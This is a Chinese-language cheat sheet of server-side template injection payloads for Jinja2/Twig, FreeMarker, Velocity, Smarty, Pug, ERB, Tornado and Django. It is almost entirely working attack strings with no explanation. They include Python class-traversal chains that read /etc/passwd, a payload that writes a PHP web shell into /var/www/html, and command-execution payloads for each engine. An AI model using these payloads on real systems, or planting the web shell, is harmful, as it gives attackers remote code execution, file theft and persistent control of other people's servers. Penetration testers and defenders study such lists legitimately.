# SSTI模板注入

## 1. Jinja2/Twig

```python
{{7*7}}
{{config}}
{{request}}
{{self.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()}}
```

### 读取文件

```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

### 写文件

```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET["cmd"]); ?>')}}
```

### 命令执行

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## 2. FreeMarker

```
${7*7}
${java.lang.Runtime.getRuntime().exec('id')}
```

### 命令执行

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

## 3. Velocity

```
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
$rt.getRuntime().exec('id')
```

## 4. Smarty

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_FILENAME,"<?php system('id');?>",self::clearCompileId())}
```

## 5. Jade/Pug

```pug
- var x = process.mainModule.require('child_process').execSync('id')
= x
```

## 6. ERB (Ruby)

```erb
<%= system('id') %>
<%= `id` %>
<%= File.read('/etc/passwd') %>
```

## 7. Tornado

```
{% import os %}
{{ os.popen('id').read() }}
```

## 8. Django

```
{{ request }}
{{ request.__class__.__mro__[2].__subclasses__() }}
```
